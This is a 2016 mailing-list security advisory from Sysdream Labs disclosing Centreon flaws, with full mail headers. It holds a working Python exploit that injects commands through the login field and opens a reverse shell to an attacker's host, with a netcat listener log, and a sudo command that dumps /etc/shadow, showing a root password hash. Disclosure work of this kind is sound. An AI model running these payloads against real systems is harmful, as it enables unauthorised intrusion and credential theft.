X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7198" "Thursday" "25" "February" "2016" "11:08:39" "+0100" "Sysdream Labs" "labs@sysdream.com" "<56CED2A7.3090400@sysdream.com>" "243" "[oss-security] CVE ID Request : Centreon remote code execution" nil nil nil "2" "2016022510:08:39" "[oss-security] CVE ID Request : Centreon remote code execution" (number mark "U       labs@sysdrea Feb 25  243/7198  " thread-indent "\"[oss-security] CVE ID Request : Centreon remote code execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10050 invoked by uid 550); 25 Feb 2016 10:46:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7494 invoked from network); 25 Feb 2016 10:08:58 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <56CED2A7.3090400@sysdream.com>
Date: Thu, 25 Feb 2016 11:08:39 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="A5icHKcXlNolwRxi8xFUsSaV6s29qMLW1"
Subject: [oss-security] CVE ID Request : Centreon remote code execution

--A5icHKcXlNolwRxi8xFUsSaV6s29qMLW1
Content-Type: multipart/mixed; boundary="hqhxg3deQumQHKlsmV6n499oUbrqSJGCE"
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <56CED2A7.3090400@sysdream.com>
Subject: CVE ID Request : Centreon remote code execution

--hqhxg3deQumQHKlsmV6n499oUbrqSJGCE
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Unauthenticated Remote Command Execution in Centreon Web Interface
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D


Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Centreon is a popular monitoring solution.

A critical vulnerability has been found in the Centreon logging class
allowing remote users to execute arbitrary commands.


SQL injection leading to RCE
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

Centreon logs SQL database errors in a log file using the "echo" system
command and the exec() PHP function. On the authentification class,
Centreon use htmlentities with the ENT_QUOTES options to filter SQL
entities.
However, Centreon doesn't filter the SQL escape character "\" and it is
possible to generate an SQL Error.
Because of the use of the "echo" system command with the PHP exec()
function, and because of the lack of sanitization, it is possible to
inject arbitrary system commands.

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-78

----------------
Proof of Concept
----------------

TCP Reverse Shell using python.

    #!/usr/bin/env python
    import requests
    import argparse

    def shell(target, reverseip, reverseport):
        payload =3D 'import socket as a,subprocess as b,os as
c;s=3Da.socket(2,1);s.connect(("%s",%d));d=3Ds.fileno();c.dup2(d,0);c.dup2(=
d,1);c.dup2(d,2);p=3Db.call(["sh"]);'
% (reverseip,reverseport)
        print "[~] Starting reverseshell : %s - port : %d" % (reverseip,
reverseport)
        req =3D requests.post(target, data=3D{"useralias": "$(echo %s |
base64 -d | python)\\" % payload.encode("base64").replace("\n",""),
"password": "foo"})
        print "[+] DEAD !"

    if __name__ =3D=3D "__main__":
        print "[~] Centreon Unauthentificated RCE - Nicolas Chatelain
<n.chatelain@sysdream.com>"
        parser =3D argparse.ArgumentParser()
        parser.add_argument("--target", required=3DTrue)
        parser.add_argument("--reverseip", required=3DTrue)
        parser.add_argument("--reverseport", required=3DTrue, type=3Dint)
        args =3D parser.parse_args()
        shell(args.target, args.reverseip, args.reverseport)

Shell :

    nightlydev@nworkstation ~/Lab/Centreon $ python reverseshell.py
--target=3Dhttp://172.16.138.137/centreon/index.php
--reverseip=3D172.16.138.1 --reverseport 8888
    [~] Centreon Unauthentificated RCE - Nicolas Chatelain
<n.chatelain@sysdream.com>
    [~] Starting reverseshell : 172.16.138.1 - port : 8888

# Other term

nightlydev@nworkstation ~/Lab/Centreon $ nc -lvp 8888
Ncat: Version 6.45 ( http://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 172.16.138.135.
Ncat: Connection from 172.16.138.135:50050.
whoami
apache
groups
apache centreon-engine centreon-broker centreon nagios


---------------
Vulnerable code
---------------

The vulnerable code is located in class/centreonLog.class.php, line 82
and line 154:


		/*
		 * print Error in log file.
		 */
		exec("echo \"".$string."\" >> ".$this->errorType[$id]);

In class/centreonAuth.class.php, line 227:

	 $DBRESULT =3D $this->pearDB->query("SELECT * FROM `contact` WHERE
`contact_alias` =3D '" . htmlentities($username, ENT_QUOTES, "UTF-8") . "'
AND `contact_activate` =3D '1' AND 		 `contact_register` =3D '1' LIMIT 1");


--------
Solution
--------

Update to the Centreon 2.5.4


Possible root password disclosure in centengine (Centreon Entreprise Server)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

In some configurations, when centengine can run as root (with sudo).
It's possible to read some file content.

**Access Vector**: local

**Security Risk**: high

**Vulnerability**: CWE-209

----------------
Proof of Concept
----------------

    $ sudo /usr/sbin/centengine -v /etc/shadow
    [1416391088] reading main config file
    [1416391088] error while processing a config file: [/etc/shadow:1]
bad variable name:
'root:$6$3mvvEHQM3p3afuh4$DZ377daOy.8bn42t7ur82/Geplvsj90J7cs1xsgAbRZ0JDZ8K=
dB5CcQ0ucF5dwKpnBYLon1XBqjJPqpm6Zr5R0:16392:0:99999:7:::'
    [1416391088]

---------------
Vulnerable code
---------------

In Centreon Entreprise Server (CES) : /etc/sudoers.d/centreon

CENTREON   ALL =3D NOPASSWD: /usr/sbin/centengine -v *

--------
Solution
--------

Do not allow centengine to be run as root or do not disclose the line
that caused the error.

Timeline (dd/mm/yyyy)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

* 18/11/2014 : Initial discovery
* 26/11/2014 : Contact with Centreon team
* 27/11/2014 : Centreon correct vulnerabilities
* 27/11/2014 : Centreon release version 2.5.4 that fixes vulnerabilities

Fixes
=3D=3D=3D=3D=3D

*
https://github.com/centreon/centreon/commit/a6dd914418dd185a698050349e05f10=
438fde2a9
*
https://github.com/centreon/centreon/commit/d00f3e015d6cf64e45822629b000681=
16e90ae4d
*
https://github.com/centreon/centreon/commit/015e875482d7ff6016edcca27bffe76=
5c2bd77c1

Affected versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

* Centreon <=3D 2.5.3


Credits
=3D=3D=3D=3D=3D=3D=3D

* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)


Best regards,
--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream



--hqhxg3deQumQHKlsmV6n499oUbrqSJGCE--

--A5icHKcXlNolwRxi8xFUsSaV6s29qMLW1
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJWztKnAAoJEI60jNnVslmhmZ4P/3WlE/kISHvJDDSt6vriDJrS
gdAe8WicP25QYWQgYnq6E1jVEQVkFWUSpp9dt02pkk7n+DumhailKTsy7FsZUkO1
VDd15oug5eOiFpEtYPTXUb6xKgCQKwZrk3oBTwG0/ou9wvGJ9k2WguFa58dxCciP
3J7NA1SZ9Y33g3C6pBMmy+LvwwjphvSTyyYqrx6AE6WFQyPM4ncQGvLeb4WFJXxq
YzvdJze6KbrToCm7zNti2rDK5YEFoLZT9qi24hvk/q5oBoFatFb/S9eqWUzr8J8y
YocEaYSg+KW4HwPmQwTx84iqUemcMVqdFnbSKtMCh7l0jBJcnRPu8s88Da6vNZAR
T+2i2OCOWtSF4E5RBb+B7+FESmHHlYPv9kgdyf2y9mp0KvvWriOPPBYsMU4LEwmC
pC2Kq5DCOnF8EruaiNgsP8uid5iRaGjtP98jCtF/rvkACSrCHIlYcfSYfL/PFGyU
Pjxn7wpRQq+e05cLzaT8fdW7SWI5+/bMdbpVI6r174QKJ4OqKyYbs5L+YF2UOcw1
aJ9idBtiPHC2cBi2eAj2EUACAlh80+OP8um8dRUskCoqedgQDUlvbLfRC4a1kMOG
fcMUbXlvzfeYxSqdftyrgZz5KkrjE2gohZ2KhQnp2UjSCIOh332Tk4lr7nWDsVR/
SMF8wDPDcokIXoKgxC1D
=+eMy
-----END PGP SIGNATURE-----

--A5icHKcXlNolwRxi8xFUsSaV6s29qMLW1--
